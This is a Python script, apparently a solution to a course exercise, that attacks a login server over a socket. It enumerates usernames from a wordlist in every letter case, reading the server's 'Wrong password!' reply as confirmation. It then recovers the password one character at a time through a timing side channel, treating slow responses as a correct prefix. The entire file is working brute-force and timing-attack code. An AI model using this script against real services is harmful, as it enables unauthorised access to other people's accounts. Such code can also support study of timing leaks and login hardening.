from sys import argv as args
import json
import socket
from itertools import product
from datetime import datetime

def json_from_dict(some_dict):
    return json.dumps(some_dict, indent=4)


def dict_from_json(some_json):
    return json.loads(some_json)


def interpret_result(some_json):
    result = dict_from_json(some_json)
    text = result['result']
    if text == "Wrong login!":
        return 1
    elif text == "Wrong password!":
        return 2
    elif text == "Exception happened during login":
        return 3
    elif text == "Connection success!":
        return 4


def check_dict(s, some_dict):
    json_to_send = json_from_dict(some_dict)
    s.send(json_to_send.encode())
    start = datetime.now()
    tmp = s.recv(1024)
    end = datetime.now()
    response_json = tmp.decode()
    if (end-start).microseconds >= 90000:
        return 3
    else:
        result = interpret_result(response_json)
        return result


def create_dict(login, password):
    return {'login': login,
            'password': password}


def all_case_options(string):
    return map(lambda x: ''.join(x), product(*([letter.lower(), letter.upper()] for letter in string)))


def find_login(s, common_logins):
    found = False
    while not found:
        for login in common_logins:
            login_case = all_case_options(login)
            while not found:
                try:
                    try_case = next(login_case)
                    dictionary = create_dict(try_case, password=" ")
                    # got 'wrong password!'
                    if check_dict(s, dictionary) == 2:
                        found = True

                except StopIteration:
                    break
    return try_case


def find_password(s, login, charset, common_passwords=None):
    found = False
    password = ""
    while not found:
        for letter in charset:
            try:
                try_pass = password
                try_pass += letter
                #print(try_pass)
                dictionary = create_dict(login, try_pass)
                #print(check_dict(s, dictionary))
                if check_dict(s, dictionary) == 3:
                    password = try_pass
                if check_dict(s, dictionary) == 4:
                    password = try_pass
                    found = True
                    return json_from_dict(dictionary)
            except Exception as e:
                return json_from_dict(dictionary)
    return json_from_dict(dictionary)


def hack(s):
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    with open('D:\\logins.txt', 'r') as f:
        common_logins = f.read().splitlines()
    login = find_login(s, common_logins)
    return find_password(s, login, charset)



if len(args) >= 3:
    host = args[1]
    port = int(args[2])
    with socket.socket() as s:
        try:
            s.connect((host, port))
            json_new = hack(s)
            print(json_new)
        except Exception as e:
            pass
else:
    print("start program with proper arguments!")
